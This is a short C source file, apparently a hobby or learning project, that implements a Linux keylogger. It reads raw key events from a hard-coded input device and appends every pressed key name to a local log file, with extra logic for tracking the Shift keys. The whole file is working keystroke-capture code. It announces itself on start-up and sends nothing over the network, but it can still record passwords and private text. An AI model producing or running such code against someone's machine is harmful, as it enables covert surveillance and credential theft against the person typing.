#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <libevdev-1.0/libevdev/libevdev.h>

#define KEY_LOG_FILE "./keylog.txt"

int main() {
	int fd;
	FILE *logfile; 
	char lShiftPressed=1; // I made this one because I don't feel like doing ==0 later
	char rShiftPressed=1;
	struct input_event ie;

	// Open keyboard device (event interface)
	if ((fd = open("/dev/input/event16", O_RDONLY)) == -1) {
		perror("Cannot open keyboard device");
		exit(EXIT_FAILURE);
	}

	// Open log file
	logfile = fopen(KEY_LOG_FILE, "a");
	if (logfile == NULL) {
		perror("Cannot open log file");
		close(fd);
		exit(EXIT_FAILURE);
	}

	printf("Keylogger started. Logging to %s\n", KEY_LOG_FILE);

	while (read(fd, &ie, sizeof(struct input_event))) {
		if (ie.type == EV_KEY) {
			if ((ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT)) {
				const char *key_name = libevdev_event_code_get_name(ie.type, ie.code);
				if(ie.value) {
					if(ie.code==KEY_RIGHTSHIFT && rShiftPressed) {
						fprintf(logfile, "Pressed: %s\n", key_name);
						rShiftPressed=0;
					} else if (ie.code==KEY_LEFTSHIFT && lShiftPressed) {
						fprintf(logfile, "Pressed: %s\n", key_name);
						lShiftPressed=0;
					}
				} else {
					if(ie.code==KEY_RIGHTSHIFT) {
						fprintf(logfile, "Let go of: %s\n", key_name);
						rShiftPressed=1;
					} else if (ie.code==KEY_LEFTSHIFT) {
						fprintf(logfile, "Let go of: %s\n", key_name);
						lShiftPressed=1;
					}
				}
			} else if (ie.value == 1) {
				const char *key_name = libevdev_event_code_get_name(ie.type, ie.code);
				if (key_name != NULL) {
					fprintf(logfile, "Pressed: %s\n", key_name);
					fflush(logfile); // Flush buffer to ensure data is written immediately
				}
			}
		}
	}

	fclose(logfile);
	close(fd);

	return 0;
}
